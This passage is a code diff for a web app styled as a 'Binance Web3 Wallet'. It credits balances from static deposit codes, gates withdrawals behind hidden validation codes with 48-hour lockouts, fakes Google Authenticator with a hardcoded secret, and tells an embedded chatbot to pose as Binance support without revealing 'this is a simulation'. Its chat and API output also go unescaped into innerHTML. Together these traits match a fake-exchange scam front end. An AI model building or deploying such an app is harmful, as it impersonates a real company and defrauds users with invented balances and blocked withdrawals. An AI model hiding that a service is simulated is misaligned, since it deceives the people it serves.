+    errorMsg.querySelector('span').textContent = 'This code has already been used within the last 48 hours.';
+    return;
+  }
+  if (!DEPOSIT_CODES.includes(code)) {
+    hideLoading();
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Invalid verification code.';
+    return;
+  }
+  appState.depositAttempts[code] = now;
+  appState.balances.lastKnownTotalUSD = appState.balances.totalUSD;
+  appState.balances.totalUSD += currentDeposit.amount;
+  const existingTokenIndex = appState.heldTokens.findIndex(t => t.symbol === currentDeposit.coin);
+  if (existingTokenIndex !== -1) {
+    appState.heldTokens[existingTokenIndex].balance += currentDeposit.amount;
+  } else {
+    appState.heldTokens.push({ symbol: currentDeposit.coin, id: currentDeposit.id, image: currentDeposit.image, balance: currentDeposit.amount });
+  }
+  appState.activities.unshift({
+    type: 'Deposit',
+    desc: `Deposited ${currentDeposit.amount.toFixed(2)} ${currentDeposit.coin} via ${currentDeposit.network}.`,
+    date: new Date().toISOString(),
+    status: 'Success',
+    amount: currentDeposit.amount
+  });
+  saveState();
+  hideLoading();
+  updateUI();
+  showMessage('Deposit Successful', `Successfully deposited ${currentDeposit.amount.toFixed(2)} ${currentDeposit.coin}. The token has been added to your holdings.`, 'success');
+  showPage('home');
+}
+
+// =======================================================
+// 5. WITHDRAWAL LOGIC
+// =======================================================
+let currentWithdrawal = { address: '', network: '', amount: 0, coin: 'USDT' };
+
+function showWithdrawalSelector() {
+  if (!appState.isConnected) {
+    showMessage('Wallet Required', 'Please connect your Web3 Wallet to perform a withdrawal.', 'error');
+    return;
+  }
+  if (isSuspended()) {
+    showMessage('Withdrawal Suspended', `Withdrawal functions are locked. Remaining time: ${formatTime(appState.withdrawalSuspensionEnd - Date.now())}`, 'error');
+    return;
+  }
+  document.getElementById('withdrawalSelector').classList.remove('hidden');
+  document.querySelector('#withdrawalSelector .modal-content').classList.remove('translate-y-full');
+  document.querySelector('#withdrawalSelector .modal-content').classList.add('translate-y-0');
+}
+
+function showWithdrawalDetailsPage() {
+  hideModal('withdrawalSelector');
+  document.getElementById('suspensionWarning').classList.add('hidden');
+  if (isSuspended()) {
+    document.getElementById('suspensionWarning').classList.remove('hidden');
+    document.getElementById('withdrawBtn').disabled = true;
+  } else {
+    document.getElementById('withdrawBtn').disabled = false;
+  }
+  showPage('withdrawalDetailsPage');
+}
+
+function fillFromConnectedWallet() {
+  document.getElementById('withdrawalAddress').value = appState.walletAddress;
+}
+
+function fillMaxAmount() {
+  const usdtToken = appState.heldTokens.find(t => t.symbol === 'USDT');
+  const maxAmount = usdtToken ? usdtToken.balance : appState.balances.totalUSD;
+  document.getElementById('withdrawalAmount').value = maxAmount.toFixed(2);
+}
+
+function showWithdrawalConfirmationPage() {
+  const address = document.getElementById('withdrawalAddress').value.trim();
+  const network = document.getElementById('withdrawalNetwork').value;
+  const amountInput = document.getElementById('withdrawalAmount');
+  const amount = parseFloat(amountInput.value);
+  if (isSuspended()) {
+    showMessage('Suspended', 'Withdrawal is currently suspended.', 'error');
+    return;
+  }
+  if (!address || !network || isNaN(amount) || amount <= 0 || amount > appState.balances.totalUSD) {
+    showMessage('Invalid Details', 'Please enter a valid address, select a network, and ensure the amount is valid and less than your total balance.', 'error');
+    return;
+  }
+  currentWithdrawal = { address, network, amount, coin: 'USDT' };
+  document.getElementById('confirmAmount').textContent = amount.toFixed(2);
+  document.getElementById('withdrawalValidationCode').value = '';
+  document.getElementById('withdrawalCodeError').classList.add('hidden');
+  showPage('withdrawalConfirmationPage');
+}
+
+async function handleWithdrawalConfirmation() {
+  const codeInput = document.getElementById('withdrawalValidationCode');
+  const code = codeInput.value.trim();
+  const errorMsg = document.getElementById('withdrawalCodeError');
+  const now = Date.now();
+  if (!code) {
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Enter your validation code.';
+    return;
+  }
+  errorMsg.classList.add('hidden');
+  showLoading('Verifying code...');
+  await waitFor(15000);
+  const lastUsed = appState.withdrawalAttempts[code];
+  if (lastUsed && now - lastUsed < (48 * 60 * 60 * 1000)) {
+    appState.withdrawalAttempts.failedCount = (appState.withdrawalAttempts.failedCount || 0) + 1;
+    saveState();
+    hideLoading();
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Code already used within the last 48 hours.';
+    handleFailedAttempt(errorMsg);
+    return;
+  }
+  if (!VALID_WITHDRAW_CODES.includes(code)) {
+    appState.withdrawalAttempts.failedCount = (appState.withdrawalAttempts.failedCount || 0) + 1;
+    saveState();
+    hideLoading();
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Validation failed. Please enter the correct code.';
+    handleFailedAttempt(errorMsg);
+    return;
+  }
+  appState.withdrawalAttempts = { failedCount: 0 };
+  appState.withdrawalAttempts[code] = now;
+  appState.withdrawalCountdownEnd = now + (24 * 60 * 60 * 1000);
+  appState.activities.unshift({
+    type: 'Withdrawal',
+    desc: `Withdrawal of ${currentWithdrawal.amount.toFixed(2)} ${currentWithdrawal.coin} initiated.`,
+    date: new Date().toISOString(),
+    status: 'Processing',
+    address: currentWithdrawal.address,
+    network: currentWithdrawal.network,
+    amount: currentWithdrawal.amount
+  });
+  saveState();
+  hideLoading();
+  showWithdrawalProcessingPage();
+}
+
+function handleFailedAttempt(errorMsg) {
+  const failedCount = appState.withdrawalAttempts.failedCount;
+  if (failedCount >= 5) {
+    appState.withdrawalSuspensionEnd = Date.now() + (48 * 60 * 60 * 1000);
+    appState.withdrawalAttempts.failedCount = 0;
+    saveState();
+    showMessage('Suspension', 'Withdrawal function suspended for 48 hours due to 5 incorrect code attempts.', 'error');
+    showPage('home');
+    return;
+  }
+  errorMsg.querySelector('span').textContent += ` (Attempt ${failedCount} of 5)`;
+}
+
+function showWithdrawalProcessingPage() {
+  const activity = appState.activities.find(a => a.type === 'Withdrawal' && a.status === 'Processing');
+  if (activity) {
+    document.getElementById('procAddress').textContent = activity.address;
+    document.getElementById('procNetwork').textContent = activity.network;
+    document.getElementById('procAmount').textContent = `$${activity.amount.toFixed(2)} USD`;
+    showPage('withdrawalProcessingPage');
+  } else {
+    showMessage('Error', 'No active withdrawal found.', 'error');
+    showPage('home');
+  }
+}
+
+// =======================================================
+// 6. MARKET & CHART LOGIC
+// =======================================================
+function initTradingView(containerId, symbol) {
+  if (typeof TradingView === 'undefined') { console.error("TradingView script not loaded."); return; }
+  const container = document.getElementById(containerId);
+  if (!container) return;
+  if (container.querySelector('iframe')) return;
+  new TradingView.widget({
+    "container_id": containerId,
+    "autosize": true,
+    "symbol": `BINANCE:${symbol}`,
+    "interval": "D",
+    "timezone": "Etc/UTC",
+    "theme": "dark",
+    "style": "1",
+    "locale": "en",
+    "toolbar_bg": "#1E2329",
+    "enable_publishing": false,
+    "allow_symbol_change": true,
+    "save_image": false,
+    "studies": ["ROC@tv-basicstudies","StochasticRSI@tv-basicstudies","MASimple@tv-basicstudies"],
+    "overrides": {
+      "paneProperties.background": "#0B0E11",
+      "paneProperties.vertGridProperties.color": "#1E2329",
+      "paneProperties.horzGridProperties.color": "#1E2329",
+      "symbolWatermarkProperties.color": "rgba(255,255,255,0.05)"
+    }
+  });
+}
+
+function updateHomeDashboard() {
+  initTradingView('tvChartContainer', 'BTCUSDT');
+  loadHotCoins();
+  loadHomeNewsSnippet();
+  loadHomeTicker();
+}
+
+async function loadHomeTicker() {
+  try {
+    const res = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false`);
+    const coins = await res.json();
+    const ticker = document.getElementById('homeTicker');
+    let html = '';
+    coins.forEach(c => {
+      const change = c.price_change_percentage_24h >= 0 ? '+' : '';
+      const color = c.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
+      html += `<span class="ticker-item ${color}">${c.symbol.toUpperCase()} $${c.current_price.toFixed(2)} ${change}${c.price_change_percentage_24h.toFixed(2)}%</span>`;
+    });
+    ticker.innerHTML = html + html; // duplicate for seamless loop
+  } catch (e) { console.error('Ticker error', e); }
+}
+
+async function loadHotCoins() {
+  const listContainer = document.getElementById('hotCoinsList');
+  if (!listContainer) return;
+  if (hotCoinsCache.length === 0) {
+    try {
+      const response = await fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=6&page=1&sparkline=false`);
+      if (!response.ok) throw new Error('Failed to fetch hot coins');
+      hotCoinsCache = await response.json();
+    } catch (e) {
+      listContainer.innerHTML = '<p class="col-span-2 text-danger text-center py-4">Failed to load hot coins.</p>';
+      return;
+    }
+  }
+  let html = '';
+  hotCoinsCache.forEach(coin => {
+    const changeClass = coin.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
+    const changeSign = coin.price_change_percentage_24h >= 0 ? '+' : '';
+    html += `
+      <div onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')" class="card card-hover cursor-pointer space-y-2 p-4">
+        <div class="flex items-center gap-2">
+          <img src="${coin.image}" onerror="this.onerror=null;this.src='https://placehold.co/24x24/1E2329/848E9C?text=${coin.symbol.substring(0,2).toUpperCase()}'" class="w-6 h-6 rounded-full" />
+          <p class="font-bold text-sm">${coin.symbol.toUpperCase()}</p>
+        </div>
+        <p class="text-xl font-extrabold tracking-tight">$${coin.current_price.toFixed(2)}</p>
+        <div class="flex items-center gap-1 ${changeClass}">
+          <svg class="w-3 h-3" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="${coin.price_change_percentage_24h >= 0 ? 'M18 15l-6-6-6 6' : 'M6 9l6 6 6-6'}"/></svg>
+          <span class="text-xs font-bold">${changeSign}${coin.price_change_percentage_24h.toFixed(2)}%</span>
+        </div>
+      </div>`;
+  });
+  listContainer.innerHTML = html;
+}
+
+function showCoinChartModal(symbol) {
+  const chartId = 'coinChartModalContainer';
+  const modalId = 'coinChartModal';
+  let modal = document.getElementById(modalId);
+  if (!modal) {
+    modal = document.createElement('div');
+    modal.id = modalId;
+    modal.className = 'fixed inset-0 modal-backdrop flex items-center justify-center p-4 z-50 hidden';
+    modal.innerHTML = `
+      <div class="modal-content w-full max-w-lg p-4 space-y-4">
+        <div class="flex items-center justify-between">
+          <h3 class="text-lg font-bold">${symbol}/USDT Live Chart</h3>
+          <button onclick="hideModal('${modalId}')" class="p-1.5 rounded-lg hover:bg-white/5 transition-colors">
+            <svg class="w-5 h-5 text-muted"><use href="#icon-close"/></svg>
+          </button>
+        </div>
+        <div class="tv-container" style="height: 350px;"><div id="${chartId}" class="w-full h-full"></div></div>
+        <button onclick="hideModal('${modalId}')" class="w-full btn-primary">Close</button>
+      </div>`;
+    document.body.appendChild(modal);
+  }
+  modal.classList.remove('hidden');
+  modal.classList.add('flex');
+  setTimeout(() => { initTradingView(chartId, `${symbol}USDT`); }, 100);
+}
+
+async function loadMarketData() {
+  const mktCap = document.getElementById('mktCap');
+  const mktVol = document.getElementById('mktVol');
+  const btcDom = document.getElementById('btcDom');
+  const activeCoins = document.getElementById('activeCoins');
+  const topCoinsList = document.getElementById('topCoinsList');
+
+  try {
+    const [globalRes, coinsRes] = await Promise.all([
+      fetch(`${COINGECKO_API}/global`),
+      fetch(`${COINGECKO_API}/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=20&page=1&sparkline=false`)
+    ]);
+    const globalData = await globalRes.json();
+    const coins = await coinsRes.json();
+
+    const format = (num) => new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', notation: 'compact', maximumFractionDigits: 2 }).format(num);
+    mktCap.textContent = format(globalData.data.total_market_cap.usd);
+    mktVol.textContent = format(globalData.data.total_volume.usd);
+    btcDom.textContent = globalData.data.market_cap_percentage.btc.toFixed(1) + '%';
+    activeCoins.textContent = globalData.data.active_cryptocurrencies.toLocaleString();
+
+    let coinHtml = coins.map(coin => {
+      const changeClass = coin.price_change_percentage_24h >= 0 ? 'text-success' : 'text-danger';
+      const changeSign = coin.price_change_percentage_24h >= 0 ? '+' : '';
+      return `
+        <div class="coin-row" onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')">
+          <div class="flex items-center gap-3">
+            <img src="${coin.image}" onerror="this.onerror=null;this.src='https://placehold.co/24x24/1E2329/848E9C?text=${coin.symbol.substring(0,2).toUpperCase()}'" class="w-7 h-7 rounded-full" />
+            <div>
+              <p class="font-bold text-sm">${coin.symbol.toUpperCase()}</p>
+              <p class="text-xs text-muted">${coin.name}</p>
+            </div>
+          </div>
+          <div class="text-right">
+            <p class="font-bold text-sm">$${coin.current_price.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:6})}</p>
+            <p class="text-xs ${changeClass} font-bold">${changeSign}${coin.price_change_percentage_24h.toFixed(2)}%</p>
+          </div>
+        </div>`;
+    }).join('');
+    topCoinsList.innerHTML = coinHtml;
+  } catch (e) {
+    console.error("Error loading market data:", e);
+    topCoinsList.innerHTML = '<p class="text-danger text-center py-4">Failed to load market data.</p>';
+  }
+}
+
+// =======================================================
+// 7. LIVE DATA INTEGRATIONS (NEW)
+// =======================================================
+async function loadLiveNews() {
+  const container = document.getElementById('newsContent');
+  if (!container) return;
+  container.innerHTML = `<div class="flex items-center justify-center py-8"><div class="spinner mr-3"></div><span class="text-sm text-muted">Fetching news...</span></div>`;
+  try {
+    const res = await fetch(FINNHUB_NEWS_API);
+    const news = await res.json();
+    if (!Array.isArray(news) || news.length === 0) throw new Error('No news');
+    let html = '';
+    news.slice(0, 8).forEach(item => {
+      const date = new Date(item.datetime * 1000).toLocaleDateString();
+      html += `
+        <div class="news-card">
+          ${item.image ? `<img src="${item.image}" onerror="this.style.display='none'" alt="">` : ''}
+          <div class="flex items-center gap-2 mb-2">
+            <span class="badge badge-accent">${item.category || 'News'}</span>
+            <span class="text-xs text-muted">${date}</span>
+          </div>
+          <a href="${item.url}" target="_blank" class="font-bold text-sm text-text hover:text-accent transition-colors line-clamp-2">${item.headline}</a>
+          <p class="text-xs text-muted mt-1 line-clamp-2">${item.summary || ''}</p>
+        </div>`;
+    });
+    container.innerHTML = html;
+  } catch (e) {
+    container.innerHTML = `
+      <div class="news-card">
+        <div class="flex items-center gap-2 mb-2"><span class="badge badge-accent">Launch Pool</span></div>
+        <p class="font-bold text-sm">Stake BNB to earn rewards in the new DeFi project launch.</p>
+        <p class="text-xs text-muted mt-1">Bitcoin dominance remains strong above 50% as institutional interest continues to rise.</p>
+      </div>
+      <div class="news-card">
+        <div class="flex items-center gap-2 mb-2"><span class="badge badge-success">Market</span></div>
+        <p class="font-bold text-sm">Live market data is updated from CoinGecko Public API every minute.</p>
+        <p class="text-xs text-muted mt-1">Global crypto market cap and volume are tracked in real-time.</p>
+      </div>`;
+  }
+}
+
+async function loadHomeNewsSnippet() {
+  const container = document.getElementById('homeNewsSnippet');
+  try {
+    const res = await fetch(FINNHUB_NEWS_API);
+    const news = await res.json();
+    if (!Array.isArray(news) || news.length === 0) throw new Error('No news');
+    const item = news[0];
+    container.innerHTML = `
+      <div class="news-card !p-0 overflow-hidden">
+        ${item.image ? `<img src="${item.image}" class="!rounded-none !h-40 w-full" onerror="this.style.display='none'">` : ''}
+        <div class="p-4">
+          <div class="flex items-center gap-2 mb-2">
+            <span class="badge badge-accent">${item.category || 'News'}</span>
+            <span class="text-xs text-muted">${new Date(item.datetime * 1000).toLocaleDateString()}</span>
+          </div>
+          <a href="${item.url}" target="_blank" class="font-bold text-sm text-text hover:text-accent transition-colors">${item.headline}</a>
+        </div>
+      </div>`;
+  } catch (e) {
+    container.innerHTML = `
+      <div class="news-card">
+        <div class="flex items-center gap-2 mb-2"><span class="badge badge-accent">Launch Pool</span></div>
+        <p class="font-bold text-sm">New staking opportunities available for BNB holders.</p>
+      </div>`;
+  }
+}
+
+async function loadAllSymbolsAZ() {
+  const list = document.getElementById('azSymbolsList');
+  const jumpBar = document.getElementById('azJumpBar');
+  const countLabel = document.getElementById('azCount');
+  if (!list) return;
+  list.innerHTML = `<div class="flex items-center justify-center py-8"><div class="spinner mr-3"></div><span class="text-sm text-muted">Loading symbols...</span></div>`;
+  try {
+    if (allSymbolsCache.length === 0) {
+      const res = await fetch(`${COINGECKO_API}/coins/list?include_platform=false`);
+      allSymbolsCache = await res.json();
+      allSymbolsCache.sort((a, b) => a.symbol.localeCompare(b.symbol));
+    }
+    countLabel.textContent = allSymbolsCache.length.toLocaleString() + ' assets';
+    const letters = [...new Set(allSymbolsCache.map(c => c.symbol[0].toUpperCase()))].sort();
+    jumpBar.innerHTML = letters.map(l => `<button onclick="jumpToLetter('${l}')">${l}</button>`).join('');
+    renderSymbolsAZ(allSymbolsCache);
+  } catch (e) {
+    list.innerHTML = `<p class="text-danger text-center py-4">Failed to load symbols.</p>`;
+  }
+}
+
+function renderSymbolsAZ(coins) {
+  const list = document.getElementById('azSymbolsList');
+  if (!list) return;
+  let html = '';
+  let currentLetter = '';
+  coins.forEach(c => {
+    const first = c.symbol[0].toUpperCase();
+    if (first !== currentLetter) {
+      currentLetter = first;
+      html += `<div id="letter-${first}" class="sticky top-0 bg-[#0B0E11] z-10 py-2 px-3 text-xs font-bold text-muted uppercase tracking-wider border-b border-border">${first}</div>`;
+    }
+    html += `
+      <div class="coin-row !py-2.5" onclick="showCoinChartModal('${c.symbol.toUpperCase()}')">
+        <div class="flex items-center gap-3">
+          <div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center text-xs font-bold text-muted">${c.symbol.substring(0,2).toUpperCase()}</div>
+          <div>
+            <p class="font-bold text-sm">${c.symbol.toUpperCase()}</p>
+            <p class="text-xs text-muted">${c.name}</p>
+          </div>
+        </div>
+        <svg class="w-4 h-4 text-muted"><use href="#icon-arrow-right"/></svg>
+      </div>`;
+  });
+  list.innerHTML = html;
+}
+
+function jumpToLetter(letter) {
+  const el = document.getElementById('letter-' + letter);
+  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+function filterAZSymbols(query) {
+  const term = query.trim().toLowerCase();
+  if (!term) { renderSymbolsAZ(allSymbolsCache); return; }
+  const filtered = allSymbolsCache.filter(c => c.symbol.toLowerCase().includes(term) || c.name.toLowerCase().includes(term));
+  renderSymbolsAZ(filtered);
+}
+
+async function loadForexRates() {
+  const container = document.getElementById('forexRates');
+  if (!container) return;
+  try {
+    const res = await fetch(EXCHANGE_API);
+    const data = await res.json();
+    const rates = data.conversion_rates;
+    const keys = ['EUR','GBP','JPY','CNY','AUD','CAD','CHF','HKD','SGD'];
+    let html = '';
+    keys.forEach(k => {
+      if (rates[k]) html += `
+        <div class="bg-surface rounded-lg p-2 border border-border">
+          <p class="text-[10px] text-muted uppercase font-bold">${k}</p>
+          <p class="text-sm font-bold text-text">${rates[k].toFixed(4)}</p>
+        </div>`;
+    });
+    container.innerHTML = html || '<p class="col-span-3 text-muted text-sm">Rates unavailable</p>';
+  } catch (e) {
+    container.innerHTML = '<p class="col-span-3 text-muted text-sm">Rates unavailable</p>';
+  }
+}
+
+function startLivePriceUpdates() {
+  if (livePriceInterval) return;
+  livePriceInterval = setInterval(() => {
+    if (appState.isConnected) renderHoldings();
+  }, 30000);
+}
+function stopLivePriceUpdates() {
+  if (livePriceInterval) { clearInterval(livePriceInterval); livePriceInterval = null; }
+}
+
+// =======================================================
+// 8. ACCOUNT & SECURITY
+// =======================================================
+function updateAccountPage() {
+  document.getElementById('accountUserID').textContent = appState.isConnected ? appState.userID : '---';
+  document.getElementById('accountWalletAddress').textContent = appState.isConnected ? appState.walletAddress : '---';
+  document.getElementById('accountWalletBalance').textContent = appState.isConnected ? `$${appState.balances.totalUSD.toFixed(2)} USD` : '---';
+}
+
+function updateAccountDetailsPage() {
+  document.getElementById('detailUserID').textContent = appState.isConnected ? appState.userID : '---';
+  document.getElementById('detailWalletAddress').textContent = appState.isConnected ? appState.walletAddress : '---';
+  document.getElementById('detailWalletBalance').textContent = appState.isConnected ? `$${appState.balances.totalUSD.toFixed(2)} USD` : '---';
+}
+
+function updateGoogleAuthPage() {
+  document.getElementById('authUserID').textContent = appState.isConnected ? appState.userID : '---';
+  const secretKey = 'A1B2C3D4E5F6G7H8';
+  const issuer = 'BinanceWeb3';
+  const accountName = appState.userID;
+  const otpAuthUri = `otpauth://totp/${issuer}:${accountName}?secret=${secretKey}&issuer=${issuer}`;
+  const qrContainer = document.getElementById('authQrCode');
+  qrContainer.innerHTML = '';
+  new QRCode(qrContainer, { text: otpAuthUri, width: 160, height: 160, colorDark: "#000000", colorLight: "#ffffff", correctLevel: QRCode.CorrectLevel.H });
+  document.getElementById('authSecretKey').textContent = secretKey;
+}
+
+async function verifyGoogleAuthCode() {
+  const code = document.getElementById('authCodeInput').value.trim();
+  const errorMsg = document.getElementById('authCodeError');
+  if (!code || code.length !== 6 || isNaN(code)) {
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Please enter a valid 6-digit code.';
+    return;
+  }
+  errorMsg.classList.add('hidden');
+  showLoading('Verifying Code...');
+  await waitFor(5000);
+  if (code === '123456' || code === '654321') {
+    hideLoading();
+    appState.isConnected = true;
+    saveState();
+    showMessage('Verification Successful!', 'Google Authenticator is now linked to your account.', 'success');
+    showPage('accountDetails');
+  } else {
+    hideLoading();
+    errorMsg.classList.remove('hidden');
+    errorMsg.querySelector('span').textContent = 'Verification failed. Please check the code and try again.';
+  }
+}
+
+// =======================================================
+// 9. NOTIFICATION & SEARCH
+// =======================================================
+function toggleNotifications(isOn) {
+  appState.notificationOn = isOn;
+  saveState();
+  updateNotificationPage();
+}
+
+function updateNotificationPage() {
+  const toggle = document.getElementById('notificationToggle');
+  if (toggle) toggle.checked = appState.notificationOn;
+  const notificationList = document.getElementById('notificationList');
+  let html = appState.activities.filter(a => a.type === 'Deposit' || a.type === 'Withdrawal')
+    .map(a => `
+      <div class="card border-l-4 ${a.status === 'Success' ? '!border-success' : a.status === 'Failed' ? '!border-danger' : '!border-accent'}">
+        <p class="font-bold text-sm">${a.type} ${a.status}</p>
+        <p class="text-xs text-muted">${a.desc}</p>
+        <p class="text-xs text-muted mt-1">${new Date(a.date).toLocaleString()}</p>
+      </div>
+    `).join('');
+  html += `
+    <div class="card border-l-4 !border-accent">
+      <p class="font-bold text-sm">Market News Update</p>
+      <p class="text-xs text-muted">BTC price surged past $68,000 overnight. Volatility high.</p>
+      <p class="text-xs text-muted mt-1">${new Date().toLocaleTimeString()} - Today</p>
+    </div>
+    <div class="card border-l-4 !border-success">
+      <p class="font-bold text-sm">Launch Pool Reminder</p>
+      <p class="text-xs text-muted">New staking opportunities available for BNB holders.</p>
+      <p class="text-xs text-muted mt-1">Yesterday</p>
+    </div>
+  `;
+  notificationList.innerHTML = html || `<p class="text-sm text-muted text-center py-6 bg-card rounded-xl border border-border">No recent alerts.</p>`;
+}
+
+async function showDailyNotificationBanner() {
+  const banner = document.getElementById('dailyNotificationBanner');
+  const now = Date.now();
+  const twelveHours = 12 * 60 * 60 * 1000;
+  if (appState.notificationOn && now - appState.lastNotificationTime > twelveHours) {
+    try {
+      const response = await fetch(`${COINGECKO_API}/search/trending`);
+      const data = await response.json();
+      const trendingCoin = data.coins[0]?.item;
+      if (trendingCoin) {
+        document.getElementById('dailyNotificationMessage').textContent = `Trending: ${trendingCoin.name} (${trendingCoin.symbol.toUpperCase()}) is up ${trendingCoin.data.price_change_percentage_24h.usd.toFixed(2)}% in the last 24h!`;
+        banner.classList.remove('hidden');
+        appState.lastNotificationTime = now;
+        saveState();
+      }
+    } catch (e) { console.error("Banner error:", e); }
+  }
+}
+
+function hideDailyNotification() {
+  document.getElementById('dailyNotificationBanner').classList.add('hidden');
+}
+
+let searchTimeout;
+document.getElementById('globalSearchInput').addEventListener('input', () => {
+  clearTimeout(searchTimeout);
+  searchTimeout = setTimeout(performGlobalSearch, 500);
+});
+
+async function performGlobalSearch() {
+  const query = document.getElementById('globalSearchInput').value.trim();
+  const resultsDiv = document.getElementById('searchResults');
+  if (query.length < 2) {
+    resultsDiv.innerHTML = '<p class="text-sm text-muted text-center py-6 bg-card rounded-xl border border-border">Start typing to search assets and news.</p>';
+    return;
+  }
+  resultsDiv.innerHTML = '<p class="text-sm text-accent text-center py-4">Searching...</p>';
+  try {
+    const [cgRes, newsRes] = await Promise.all([
+      fetch(`${COINGECKO_API}/search?query=${query}`),
+      fetch(FINNHUB_NEWS_API)
+    ]);
+    const cgData = await cgRes.json();
+    const newsData = await newsRes.json();
+
+    let html = '<h3 class="font-bold text-sm text-muted uppercase tracking-wider mb-2">Coins</h3>';
+    if (cgData.coins.length > 0) {
+      html += cgData.coins.slice(0, 10).map(coin => `
+        <div onclick="showCoinChartModal('${coin.symbol.toUpperCase()}')" class="coin-row !py-2.5 cursor-pointer">
+          <div class="flex items-center gap-3">
+            <img src="${coin.thumb}" class="w-7 h-7 rounded-full" onerror="this.onerror=null;this.src='https://placehold.co/28x28/1E2329/848E9C?text=${coin.symbol.substring(0,2).toUpperCase()}'" />
+            <div>
+              <p class="font-bold text-sm">${coin.symbol.toUpperCase()}</p>
+              <p class="text-xs text-muted">${coin.name}</p>
+            </div>
+          </div>
+          <span class="text-xs text-accent font-bold">View &rarr;</span>
+        </div>
+      `).join('');
+    } else {
+      html += '<p class="text-sm text-muted">No coins match your search.</p>';
+    }
+
+    const relatedNews = newsData.filter(n => n.headline.toLowerCase().includes(query.toLowerCase())).slice(0, 3);
+    if (relatedNews.length > 0) {
+      html += `<h3 class="font-bold text-sm text-muted uppercase tracking-wider mb-2 mt-4">Related News</h3>`;
+      html += relatedNews.map(n => `
+        <div class="news-card">
+          <div class="flex items-center gap-2 mb-1"><span class="badge badge-accent">News</span></div>
+          <a href="${n.url}" target="_blank" class="font-bold text-sm hover:text-accent transition-colors">${n.headline}</a>
+        </div>
+      `).join('');
+    }
+    resultsDiv.innerHTML = html;
+  } catch (e) {
+    resultsDiv.innerHTML = '<p class="text-danger text-center py-4">An error occurred during search.</p>';
+  }
+}
+
+// =======================================================
+// 10. CHATBOT
+// =======================================================
+async function sendChatMessage() {
+  const chatInput = document.getElementById('chatInput');
+  const chatMessages = document.getElementById('chatMessages');
+  const userMessage = chatInput.value.trim();
+  if (!userMessage) return;
+  const userMsgHtml = `<div class="flex justify-end"><div class="bg-[#2B3139] text-text p-3 rounded-2xl rounded-br-sm max-w-[85%] shadow-md text-sm">${userMessage}</div></div>`;
+  chatMessages.innerHTML += userMsgHtml;
+  chatInput.value = '';
+  chatMessages.scrollTop = chatMessages.scrollHeight;
+  const botLoadingId = 'bot-loading-' + Date.now();
+  const botLoadingHtml = `<div class="flex justify-start" id="${botLoadingId}"><div class="bg-accent text-[#181A20] p-3 rounded-2xl rounded-bl-sm max-w-[85%] shadow-md"><div class="flex items-center gap-2 text-sm font-bold"><div class="w-4 h-4 border-2 border-[#181A20] border-t-transparent rounded-full animate-spin"></div>Thinking...</div></div></div>`;
+  chatMessages.innerHTML += botLoadingHtml;
+  chatMessages.scrollTop = chatMessages.scrollHeight;
+  try {
+    const systemPrompt = "You are a friendly and knowledgeable Binance Web3 Wallet support assistant. Keep your responses concise and helpful. Do not mention that this is a simulation. Do not use markdown formatting.";
+    const payload = { contents: [{ parts: [{ text: userMessage }] }], systemInstruction: { parts: [{ text: systemPrompt }] } };
+    const response = await fetch(GEMINI_API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    const result = await response.json();
+    const botResponseText = result.candidates?.[0]?.content?.parts?.[0]?.text || "Sorry, I'm having trouble connecting to the service right now. Please try again later.";
+    const loadingElement = document.getElementById(botLoadingId);
+    if (loadingElement) {
+      loadingElement.outerHTML = `<div class="flex justify-start"><div class="bg-accent text-[#181A20] p-3 rounded-2xl rounded-tl-sm max-w-[85%] shadow-md text-sm font-medium">${botResponseText}</div></div>`;
+    }
+  } catch (e) {
+    console.error("Gemini API simulation failed:", e);
+    const loadingElement = document.getElementById(botLoadingId);
+    if (loadingElement) {
+      loadingElement.outerHTML = `<div class="flex justify-start"><div class="bg-danger/20 text-danger p-3 rounded-2xl rounded-tl-sm max-w-[85%] shadow-md text-sm font-medium">Support service connection failed. Please check your network.</div></div>`;
+    }
+  }
+  chatMessages.scrollTop = chatMessages.scrollHeight;
+}
+
+// =======================================================
+// 11. INITIALIZATION
+// =======================================================
+function initApp() {
+  loadState();
+  updateUI();
+  showPage(appState.currentPage);
+  setInterval(checkCountdownAndSuspension, 1000);
+  showDailyNotificationBanner();
+  setInterval(showDailyNotificationBanner, 60 * 60 * 1000);
+  if (appState.withdrawalCountdownEnd > Date.now()) showPage('withdrawalProcessingPage');
+}
+
+window.onload = initApp;
+</script>
+</body>
+</html>
